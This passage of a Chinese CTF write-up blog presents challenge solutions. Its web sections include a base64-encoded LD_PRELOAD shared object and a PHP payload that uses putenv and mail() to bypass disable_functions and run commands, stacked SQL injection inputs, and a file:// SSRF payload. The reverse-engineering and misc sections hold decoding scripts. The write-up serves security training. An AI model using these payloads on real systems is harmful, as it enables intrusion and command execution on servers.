AAAAAYAAAAAAAAA+AEAAAAAAAAKAAAAAAAAAMoAAAAAAAAACwAAAAAAAAAYAAAAAAAAAAMAAAAAAAAAGAsgAAAAAAACAAAAAAAAAHgAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAwAUAAAAAAAAHAAAAAAAAANAEAAAAAAAACAAAAAAAAADwAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAALAEAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAigQAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoCSAAAAAAAAAAAAAAAAAAAAAAAAAAAAB2BgAAAAAAAIYGAAAAAAAAlgYAAAAAAACmBgAAAAAAALYGAAAAAAAAWAsgAAAAAABHQ0M6IChEZWJpYW4gNC45LjItMTArZGViOHUyKSA0LjkuMgAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5qY3IALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQCQAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgC4AQAAAAAAAAAAAAAAAAAAAAAAAAMAAwD4AQAAAAAAAAAAAAAAAAAAAAAAAAMABADAAwAAAAAAAAAAAAAAAAAAAAAAAAMABQCKBAAAAAAAAAAAAAAAAAAAAAAAAAMABgCwBAAAAAAAAAAAAAAAAAAAAAAAAAMABwDQBAAAAAAAAAAAAAAAAAAAAAAAAAMACADABQAAAAAAAAAAAAAAAAAAAAAAAAMACQA4BgAAAAAAAAAAAAAAAAAAAAAAAAMACgBgBgAAAAAAAAAAAAAAAAAAAAAAAAMACwDABgAAAAAAAAAAAAAAAAAAAAAAAAMADABgCAAAAAAAAAAAAAAAAAAAAAAAAAMADQBpCAAAAAAAAAAAAAAAAAAAAAAAAAMADgCECAAAAAAAAAAAAAAAAAAAAAAAAAMADwCgCAAAAAAAAAAAAAAAAAAAAAAAAAMAEAAICSAAAAAAAAAAAAAAAAAAAAAAAAMAEQAYCSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAMAEwAoCSAAAAAAAAAAAAAAAAAAAAAAAAMAFADoCiAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAAAAAAA9AAAAAEAEwAoCSAAAAAAAAAAAAAAAAAA/QAAAAEAFgBgCyAAAAAAAAAAAAAAAAAACQEAAAEAFQAYCyAAAAAAAAAAAAAAAAAAHwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwEAACAAAAAAAAAAAAAAAAAAAAAAAAAATwEAABAAFgBgCyAAAAAAAAAAAAAAAAAAVgEAABIADABgCAAAAAAAAAAAAAAAAAAAXAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAfwEAABEAAAAAAAAAAAAAAAAAAAAAAAAAlAEAABAAFwBoCyAAAAAAAAAAAAAAAAAAmQEAABAAFwBgCyAAAAAAAAAAAAAAAAAApQEAABIACwDABwAAAAAAAJ0AAAAAAAAArQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAwQEAABEAAAAAAAAAAAAAAAAAAAAAAAAA2AEAACAAAAAAAAAAAAAAAAAAAAAAAAAA8gEAACIAAAAAAAAAAAAAAAAAAAAAAAAADgIAABIACQA4BgAAAAAAAAAAAAAAAAAAFAIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAHJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY2NzAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfZWRhdGEAX2ZpbmkAc3lzdGVtQEBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBlbnZpcm9uQEBHTElCQ18yLjIuNQBfZW5kAF9fYnNzX3N0YXJ0AHByZWxvYWQAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2Vudmlyb25AQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AHN0cnN0ckBAR0xJQkNfMi4yLjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAAuAEAAAAAAAC4AQAAAAAAADwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAPgBAAAAAAAA+AEAAAAAAADIAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADAAwAAAAAAAMADAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAigQAAAAAAACKBAAAAAAAACYAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAALAEAAAAAAAAsAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA&#x27;</span>;var_dump(file_put_contents(<span class="string">&#x27;/var/tmp/helloworld.so&#x27;</span>,base64_decode(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<h3 id="2-利用so文件绕过被ban的函数"><a href="#2-利用so文件绕过被ban的函数" class="headerlink" title="2. 利用so文件绕过被ban的函数"></a>2. 利用so文件绕过被ban的函数</h3><p>把so文件传上去后其实可以继续传项目里的那个php的, 不过还是想试试能不能直接在payload里面实现.</p>
<p>其实也不难, 先设置需要执行的命令<code>/readflag &gt; /var/tmp/K1rit0</code>, 再设置环境变量LD_PRELOAD的值为刚刚传上去的helloworld.so, 然后调用mail(). 这个时候就会再/tmp下生成一个K1rit0, 里面就是/readflag的结果了!</p>
<p>所以payload为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(putenv(<span class="string">&quot;EVIL_CMDLINE=/readflag &gt; /var/tmp/K1rit0&quot;</span>));var_dump(putenv(<span class="string">&quot;LD_PRELOAD=/var/tmp/helloworld.so&quot;</span>));var_dump(mail(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>));var_dump(file_get_contents(<span class="string">&#x27;/var/tmp/K1rit0&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p><a name='7'></a></p>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-18a14a4782f849fe8a713ba563b6d543.png" alt="图片.png"><br>真的很baby, query语句直接给出来了.参考自己的另外一个坑就能做了<a target="_blank" rel="noopener" href="http://47.98.130.190:8090/archives/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%BB%8F%E9%AA%8C%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0">某篇sql总结</a></p>
<p>当时想都没想直接堆叠注入了(以至于以为这题过滤都没有,其实select这些还是被过滤掉了的<br><code>1&#39;;show databases;show tables #</code> 直接爆出库名和表名了<br><code>1&#39;;desc flag # </code> 爆出字段名<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-f11c852b4304418e9c58a9f0376e48e5.png" alt="图片.png"><br>然后就发现特殊字符串enjoy_Sq1i11_qu3ryy 包裹ctf{}提交了<br><a name='8'></a></p>
<h2 id="babyssrf"><a href="#babyssrf" class="headerlink" title="babyssrf"></a>babyssrf</h2><p>白给白给</p>
<p>利用file://协议, 提示说的很清楚了就在/flag</p>
<p>payload: <code>?url=file:///flag</code><br><a name='9'></a></p>
<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>搜啊搜搜啊搜, 真的是搜出来的flag哦(按着提示搜就行了<br><a name='10'></a></p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><blockquote>
<p>因为本身就是为了拿分才做的RE, 所以wp就比较简短了(真不想写hhh</p>
<blockquote>
<p>可以去看看Misaka大佬的wp</p>
</blockquote>
</blockquote>
<h2 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h2><p>Ida打开文件, 随便翻了翻, 发现<br> <img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-4dae16af3f344b97a2c1ba697cafc21a.png" alt="图片.png"><br>根据语义手动拼回flag<br><a name='11'></a></p>
<h2 id="basic-hash"><a href="#basic-hash" class="headerlink" title="basic_hash"></a>basic_hash</h2><p>我就只会F5! 还好主函数很简单, 就是要求做题人利用异或运算的特点A+B+B = A还原两个md5值,然后扔到某<a target="_blank" rel="noopener" href="https://www.cmd5.com/">MD5<del>爆破</del>网站</a>获得flag.<br>把ida中的两个字符串的值手动输入到脚本中,跑脚本就完事了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v9 = [<span class="number">70</span>, -<span class="number">121</span>, -<span class="number">115</span>, <span class="number">4</span>, -<span class="number">67</span>, <span class="number">52</span>, <span class="number">126</span>, <span class="number">42</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">79</span>, <span class="number">91</span>, -<span class="number">61</span>, -<span class="number">63</span>, <span class="number">6</span>, -<span class="number">14</span>]</span><br><span class="line">v26 = [<span class="number">59</span>, -<span class="number">87</span>, <span class="number">103</span>, -<span class="number">122</span>, -<span class="number">46</span>, -<span class="number">112</span>, <span class="number">104</span>, -<span class="number">30</span>, -<span class="number">92</span>, <span class="number">113</span>, <span class="number">125</span>, -<span class="number">85</span>, -<span class="number">14</span>, <span class="number">41</span>, -<span class="number">24</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">mask = <span class="number">0b11111111</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">    <span class="keyword">if</span> v9[i] &lt; <span class="number">0</span>:</span><br><span class="line">        v9[i] = <span class="built_in">abs</span>(v9[i] ^ mask) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v26)):</span><br><span class="line">    <span class="keyword">if</span> v26[i] &lt; <span class="number">0</span>:</span><br><span class="line">        v26[i] = <span class="built_in">abs</span>(v26[i] ^ mask) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">input1_md5 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(i ^ <span class="number">0x30</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> v9])</span><br><span class="line">input2_md5 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(i ^ <span class="number">0x20</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> v26])</span><br><span class="line">print(input1_md5)</span><br><span class="line">print(input2_md5)</span><br></pre></td></tr></table></figure>
<p>这样就拿到两个MD5了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">76b7bd348d044e1a41427f6bf3f136c2</span><br><span class="line">1b8947a6f2b048c284515d8bd209c83f</span><br></pre></td></tr></table></figure>
<p>扔进网站, 得到flag<br><a name='12'></a></p>
<h2 id="ByteCode"><a href="#ByteCode" class="headerlink" title="ByteCode"></a>ByteCode</h2><p>因为爽哥说很简单, 所以我就来看看, 百度了一下ByteCode. 知道是就是一堆操作之后. 找到ByteCode和操作的对应表! 拿出纸笔! 点开计算机! 一点一点手动往回算…(手动算的感觉针不戳<br>算完ascii码全部转成字符串就是flag了<br><a name='13'></a></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><blockquote>
<p>说实话没想到Misc这么多题, 不过Misc做起来就感觉像猜谜一样, 也挺有趣的.</p>
</blockquote>
<h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>不亏是我最拿手的签到题.秒解flag 2333<br><a name='14'></a></p>
<h2 id="Look-at-your-keyboard"><a href="#Look-at-your-keyboard" class="headerlink" title="Look_at_your_keyboard"></a>Look_at_your_keyboard</h2><p>题目都说了看键盘咯. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewazx tyugv iuhbvghj uhb iujmn iuhbvghj yhnmki vgyhnji</span><br></pre></td></tr></table></figure>
<p>键盘上是怎样的就怎样的(所以做的时候觉得S是8, I是1的肯定不是我一个吧!<br>结果是ctfisfun, 对着键盘看就能看出来了.<br><a name='15'></a></p>
<h2 id="Buddha"><a href="#Buddha" class="headerlink" title="Buddha"></a>Buddha</h2><p>也没啥好说的.<br>新佛曰-&gt;base64-&gt;栅栏密码<br><a name='16'></a></p>
<h2 id="Do-you-know-Xp0int"><a href="#Do-you-know-Xp0int" class="headerlink" title="Do you know Xp0int"></a>Do you know Xp0int</h2><p>用记事本打开图片.<br>用<del>眼睛一行一行的看有没有flag</del>搜索<code>ctf&#123;</code> 结果啥都没<br>搜<code>&#123;</code> 就找到flag了. 似乎有个可以跑出文件中出现的字符串的脚本<br><a name='17'></a></p>
<h2 id="close-base"><a href="#close-base" class="headerlink" title="close_base"></a>close_base</h2><p>base64解码发现是C语言源码 (输出不是hello,world, 差评!<br>估计是base64隐写了, 毕竟每一行base64编码结尾都有等号, 肯定能藏很多东西2333<br>所以base64隐写是啥?这里不写了…<br>直接上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2text</span>(<span class="params">Bin</span>):</span></span><br><span class="line">    Hex = <span class="built_in">hex</span>(<span class="built_in">int</span>(Bin, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Hex) % <span class="number">2</span>: Hex = <span class="string">&#x27;0&#x27;</span> + Hex</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> [Hex[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Hex), <span class="number">2</span>)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    base = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(base)):</span><br><span class="line">    base[i] = base[i][::-<span class="number">1</span>][<span class="number">1</span>:<span class="number">5</span>][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> base:</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="keyword">if</span> j != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            o = <span class="built_in">bin</span>(table.index(j))[<span class="number">2</span>:]</span><br><span class="line">            tmp += <span class="string">&#x27;0&#x27;</span> * (<span class="number">6</span> - <span class="built_in">len</span>(o)) + o</span><br><span class="line">    tmp = tmp + <span class="string">&#x27;0&#x27;</span> * (<span class="number">24</span> - <span class="built_in">len</span>(res))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;==&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        res += tmp[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        res += tmp[<span class="number">16</span>:<span class="number">18</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctf&#123;&#x27;</span> + bin2text(res) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出的就是flag了(具体原理真的到处都有的,找就完事了<br><a name='18'></a></p>
<h2 id="PMGBA"><a href="#PMGBA" class="headerlink" title="PMGBA"></a>PMGBA</h2><p>做的最过瘾的一题(但是被自己蠢到了<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-9bfe0f9125864a95ac95233e8d3b220d.png" alt="图片.png"></p>
<p>开局一张图, 文件全靠拆.<br>说实话一开始拿到图感觉挺熟悉的, 就是记不起来这是什么…<br>直到去百度PMGBA的意思才知道是宝可梦.这不就是我上学期练级刷的怪吗!</p>
<p>我也算是半年的宝可梦老玩家了(俊强才是宝可梦大师!<br>马上跑去问俊强”上学期我刷等级刷的那个有26个形态的字母怪叫什么”<br>‘未知图腾’</p>
<p>马上去找图鉴, 对应图鉴得到字符串remember to examine the.<br>一开始拿到这个我还以为就是想让我检查这张图片的意思(鬼知道这是flag的前半部分啊喂</p>
<p>扔binwalk跑了一下发现确实不止一张图片.由于被foremost坑过所以能手动分文件就手动分了. 用winhex打开图片, 对照这文件头文件尾, 分出了三张图(包括最开始的未知图腾</p>
<p>最开始注意到的其实是第三张图, 这是我第一个练到5v的宝可梦, 卡蒂狗!<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6036d9f95b4448bd9daebe6d152ed46c.png" alt="图片.png"><br>拖进Stegsolve分析没有什么结果后. 决定看看是不是LSB. 于是又把卡蒂狗扔进zsteg, 出来了一串字符串’pwd is 58growliness\n’. </p>
<p>密码是58growliness?</p>
<p>不知道这个密码是个啥直到从第二张图里分出段base64, 解码后发现是个加密的压缩包. 密码就是58growliness</p>
<p>里面一个txt, 内容全是pi ka chu的组合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi.... 后面还有很多</span><br></pre></td></tr></table></figure>

<p>猜测是某种加密, 但是却搜不到.但后面找到一篇大概讲的是用皮卡丘语编程的文章, 大概内容就是套用brainfuck的语法来编程. 所以来试试看是不是brainfuck. </p>
<p>根据字符出现的频率自己强行脑部回了对应表(dalao说github上有!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dit=&#123; 	</span><br><span class="line">	<span class="string">&#x27;pi&#x27;</span>:<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line"> 	<span class="string">&#x27;ka&#x27;</span>:<span class="string">&#x27;-&#x27;</span>,</span><br><span class="line"> 	<span class="string">&#x27;chu&#x27;</span>:<span class="string">&#x27;]&#x27;</span>,</span><br><span class="line"> 	<span class="string">&#x27;pika&#x27;</span>:<span class="string">&#x27;[&#x27;</span>,</span><br><span class="line"> 	<span class="string">&#x27;pipi&#x27;</span>:<span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line"> 	<span class="string">&#x27;pichu&#x27;</span>:<span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line"> 	<span class="string">&#x27;pikachu&#x27;</span>:<span class="string">&#x27;.&#x27;</span>, </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>还原回brainfuck代码后运行得到的结果为foo bar</p>
<p>事实上拼接前面的remember to examine the foo bar 就是flag了.<br>但我却没有想到…(谁想的到啊<br>所以一直卡着不知道flag是啥.直到周一马克思课想着随便试一下, 才提交成功…(correct出来的时候人都傻了..<br><del>还是脑洞不够大吗</del><br><a name='19'></a></p>
<h2 id="集齐五龙珠"><a href="#集齐五龙珠" class="headerlink" title="集齐五龙珠"></a>集齐五龙珠</h2><p>一大堆的文件, 名字全都是base64. 想看看全部解码会不会有什么线索.<br>写了个脚本来解码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">base = <span class="string">&#x27;problem/&#x27;</span></span><br><span class="line"></span><br><span class="line">filenames = []</span><br><span class="line"><span class="keyword">for</span> root, ds, fs <span class="keyword">in</span> os.walk(base):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> fs:</span><br><span class="line">        print(f, b64decode(f).decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)) <span class="comment"># 输出文件名和解码之后的文件名</span></span><br></pre></td></tr></table></figure>
<p>果然里面有五个很特殊的文件, 解码之后是正常的字符串.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-0dfa9dba42d942048201e980ae4a9e65.png" alt="图片.png"><br>就是后缀带one的文件(其他的是后面解题的文件</p>
<p>winhex打开first_one和last!_one 发现似乎是一个压缩包被拆成五份了.<br>尝试还原回去, 但是不知道中间三个压缩包的顺序. 于是写了个脚本来手动尝试(因为就3个文件就8种组合, 自己调换顺序就行了.</p>
